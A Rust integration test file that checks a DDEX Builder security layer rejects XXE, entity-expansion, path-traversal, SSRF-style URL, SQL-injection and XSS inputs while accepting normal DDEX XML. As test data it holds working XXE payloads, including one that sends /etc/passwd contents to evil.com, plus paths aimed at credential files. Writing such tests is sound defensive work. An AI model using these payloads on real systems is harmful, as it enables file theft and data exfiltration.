//! Security Integration Test for DDEX Builder
//!
//! This integration test verifies that XXE (XML External Entity) attack prevention
//! and other security measures work correctly across the DDEX Builder.

use ddex_builder::{
    error::BuildError,
    security::{InputValidator, SecureXmlReader, SecurityConfig},
};
use std::io::Cursor;

/// Test basic XXE prevention
#[test]
fn test_xxe_prevention_basic() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test external DTD reference
    let xxe_payload =
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let result = validator.validate_xml_content(xxe_payload);
    assert!(
        result.is_err(),
        "XXE attack should be blocked: {:?}",
        result
    );

    // Test billion laughs attack
    let billion_laughs = r#"<!DOCTYPE bomb [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <bomb>&lol3;</bomb>"#;

    let result = validator.validate_xml_content(billion_laughs);
    assert!(
        result.is_err(),
        "Billion laughs attack should be blocked: {:?}",
        result
    );

    // Test parameter entity attack
    let param_entity_attack = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(param_entity_attack);
    assert!(
        result.is_err(),
        "Parameter entity attack should be blocked: {:?}",
        result
    );
}

/// Test that valid XML still works
#[test]
fn test_valid_xml_allowed() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let valid_xml_samples = vec![
        r#"<root><child>content</child></root>"#,
        r#"<root id="123"><child attr="value">content</child></root>"#,
        r#"<root>&lt;escaped&gt; &amp; &quot;entities&quot;</root>"#,
        r#"<root><![CDATA[<content>with special chars</content>]]></root>"#,
    ];

    for xml in valid_xml_samples {
        let result = validator.validate_xml_content(xml);
        assert!(
            result.is_ok(),
            "Valid XML should be allowed: {} -> {:?}",
            xml,
            result
        );
    }
}

/// Test SecureXmlReader with malicious content
#[test]
fn test_secure_xml_reader() {
    let config = SecurityConfig::default();

    // Test with XXE attack
    let xxe_xml =
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let cursor = Cursor::new(xxe_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config.clone());

    let mut buf = Vec::new();
    let result = reader.read_event(&mut buf);

    match result {
        Err(BuildError::Security(msg)) => {
            assert!(
                msg.contains("DTD processing not allowed")
                    || msg.contains("Dangerous entity")
                    || msg.contains("External reference")
            );
        }
        other => panic!("Expected security error, got: {:?}", other),
    }

    // Test with valid XML
    let valid_xml = r#"<root><child>content</child></root>"#;
    let cursor = Cursor::new(valid_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);

    let mut buf = Vec::new();
    let mut events = 0;

    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                events += 1;
                buf.clear();
                if events > 10 {
                    break; // Prevent infinite loop
                }
            }
            Err(e) => panic!("Valid XML should not produce errors: {:?}", e),
        }
    }

    assert!(events > 0, "Should have processed some events");
}

/// Test input validation with various attack vectors
#[test]
fn test_input_validation_comprehensive() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test various malicious inputs
    let malicious_inputs = vec![
        // XXE variations
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]><root>&xxe;</root>"#,
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "ftp://evil.com/steal">]><root>&xxe;</root>"#,
        // Entity expansion attacks
        r#"<!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]><bomb>&b;&b;&b;</bomb>"#,
        // Parameter entity attacks
        r#"<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/remote.xml">%remote;]><test/>"#,
        // Mixed attacks
        r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?%file;'>">%eval;%send;]><test/>"#,
    ];

    for (i, attack) in malicious_inputs.iter().enumerate() {
        let result = validator.validate_xml_content(attack);
        assert!(
            result.is_err(),
            "Attack {} should be blocked: {} -> {:?}",
            i + 1,
            attack,
            result
        );
    }

    // Test string validation
    let malicious_strings = vec![
        "'; DROP TABLE users; --",       // SQL injection
        "<script>alert('XSS')</script>", // Script injection
        "&malicious_entity;",            // Entity reference
        "../../../etc/passwd",           // Path traversal
        "test\0string",                  // Null byte
    ];

    for string in malicious_strings {
        let result = validator.validate_string(string, "test_field");
        // Some of these may pass string validation but should be caught elsewhere
        match result {
            Ok(sanitized) => {
                // If validation passes, ensure dangerous content is sanitized
                assert_ne!(
                    sanitized, string,
                    "Dangerous content should be sanitized: {}",
                    string
                );
            }
            Err(_) => {
                // Also acceptable - rejection is fine
            }
        }
    }
}

/// Test security configuration limits
#[test]
fn test_security_limits() {
    let restrictive_config = SecurityConfig {
        max_xml_size: 1000,   // 1KB
        max_string_size: 100, // 100 bytes
        max_xml_depth: 5,     // Very shallow
        ..SecurityConfig::default()
    };

    let validator = InputValidator::new(restrictive_config.clone());

    // Test size limits
    let large_string = "A".repeat(200);
    let result = validator.validate_string(&large_string, "large_field");
    assert!(result.is_err(), "Large string should be rejected");

    let large_xml = format!("<root>{}</root>", "A".repeat(2000));
    let result = validator.validate_xml_content(&large_xml);
    assert!(result.is_err(), "Large XML should be rejected");

    // Test depth limits with SecureXmlReader
    let deep_xml = format!(
        "{}content{}",
        (0..10).map(|i| format!("<level{}>", i)).collect::<String>(),
        (0..10)
            .rev()
            .map(|i| format!("</level{}>", i))
            .collect::<String>()
    );

    let cursor = Cursor::new(deep_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, restrictive_config);

    let mut buf = Vec::new();
    let mut depth_error_found = false;

    for _ in 0..50 {
        // Limit iterations to prevent infinite loop
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                buf.clear();
            }
            Err(BuildError::Security(msg)) => {
                if msg.contains("nesting too deep") {
                    depth_error_found = true;
                    break;
                }
            }
            Err(_) => break,
        }
    }

    assert!(depth_error_found, "Depth limit should be enforced");
}

/// Test path validation security
#[test]
fn test_path_validation() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let dangerous_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",
        "file:///etc/passwd",
        "../../../../proc/self/environ",
    ];

    for path in dangerous_paths {
        let result = validator.validate_path(path);
        assert!(
            result.is_err(),
            "Dangerous path should be rejected: {} -> {:?}",
            path,
            result
        );
    }

    // Test safe paths
    let safe_paths = vec![
        "safe/path/file.txt",
        "music/artist/album/song.mp3",
        "data.xml",
        "subdir/file.json",
    ];

    for path in safe_paths {
        let result = validator.validate_path(path);
        assert!(
            result.is_ok(),
            "Safe path should be allowed: {} -> {:?}",
            path,
            result
        );
    }
}

/// Test URL validation security
#[test]
fn test_url_validation() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test dangerous URLs
    let dangerous_urls = vec![
        "file:///etc/passwd",
        "http://localhost:8080/admin",
        "http://127.0.0.1:3000/secret",
        "http://192.168.1.1/config",
        "ftp://internal.server/data",
        "javascript:alert('XSS')",
    ];

    for url in dangerous_urls {
        let result = validator.validate_url(url);
        assert!(
            result.is_err(),
            "Dangerous URL should be rejected: {} -> {:?}",
            url,
            result
        );
    }

    // Test safe URLs
    let safe_urls = vec![
        "https://api.example.com/data",
        "http://public.server.com/content",
        "https://cdn.example.com/images/logo.png",
    ];

    for url in safe_urls {
        let result = validator.validate_url(url);
        assert!(
            result.is_ok(),
            "Safe URL should be allowed: {} -> {:?}",
            url,
            result
        );
    }
}

/// Test that security measures don't break normal operation
#[test]
fn test_normal_operation_preserved() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config.clone());

    // Test normal DDEX-like XML
    let ddex_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
    <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:MessageHeader>
            <ddex:MessageThreadId>MSG123</ddex:MessageThreadId>
            <ddex:MessageId>MSG456</ddex:MessageId>
            <ddex:MessageCreatedDateTime>2024-01-01T00:00:00Z</ddex:MessageCreatedDateTime>
        </ddex:MessageHeader>
        <ddex:UpdateIndicator>OriginalMessage</ddex:UpdateIndicator>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReleaseId>
                    <ddex:ISRC>TEST1234567890</ddex:ISRC>
                </ddex:ReleaseId>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Song Title</ddex:TitleText>
                </ddex:ReferenceTitle>
                <ddex:DisplayArtist>
                    <ddex:PartyName>Test Artist</ddex:PartyName>
                </ddex:DisplayArtist>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(ddex_xml);
    assert!(
        result.is_ok(),
        "Normal DDEX XML should be allowed: {:?}",
        result
    );

    // Test with SecureXmlReader
    let cursor = Cursor::new(ddex_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);

    let mut buf = Vec::new();
    let mut events_processed = 0;

    loop {
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                events_processed += 1;
                buf.clear();
                if events_processed > 100 {
                    panic!("Too many events, possible infinite loop");
                }
            }
            Err(e) => panic!("DDEX XML should not produce errors: {:?}", e),
        }
    }

    assert!(
        events_processed > 0,
        "Should have processed DDEX XML events"
    );
}

/// Test error messages don't leak sensitive information
#[test]
fn test_secure_error_messages() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Test XXE error message
    let xxe_attack =
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let result = validator.validate_xml_content(xxe_attack);

    match result {
        Err(BuildError::Security(msg)) => {
            // Should not contain file paths or system details
            assert!(!msg.contains("/etc/passwd"));
            assert!(!msg.contains("file://"));
            // Should contain generic security message
            assert!(
                msg.to_lowercase().contains("dtd")
                    || msg.to_lowercase().contains("entity")
                    || msg.to_lowercase().contains("external")
                    || msg.to_lowercase().contains("dangerous")
            );
        }
        other => panic!("Expected security error, got: {:?}", other),
    }

    // Test path traversal error message
    let result = validator.validate_path("../../../etc/passwd");
    match result {
        Err(BuildError::InputSanitization(msg)) => {
            assert!(!msg.contains("/etc/passwd"));
            assert!(
                msg.to_lowercase().contains("path") || msg.to_lowercase().contains("traversal")
            );
        }
        other => panic!("Expected input sanitization error, got: {:?}", other),
    }
}

/// Performance test - ensure security measures don't create DoS vulnerabilities
#[test]
fn test_performance_under_security_load() {
    use std::time::Instant;

    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Measure baseline with valid XML
    let valid_xml = r#"<root><child>content</child></root>"#;
    let start = Instant::now();

    for _ in 0..100 {
        let _ = validator.validate_xml_content(valid_xml);
    }

    let baseline = start.elapsed();

    // Measure with attack XML (should be fast rejection)
    let attack_xml =
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let start = Instant::now();

    for _ in 0..100 {
        let _ = validator.validate_xml_content(attack_xml);
    }

    let attack_duration = start.elapsed();

    // Attack processing should not be dramatically slower than normal processing
    assert!(
        attack_duration < baseline * 5, // Allow up to 5x slower
        "Attack processing too slow: {:?} vs baseline {:?}",
        attack_duration,
        baseline
    );
}
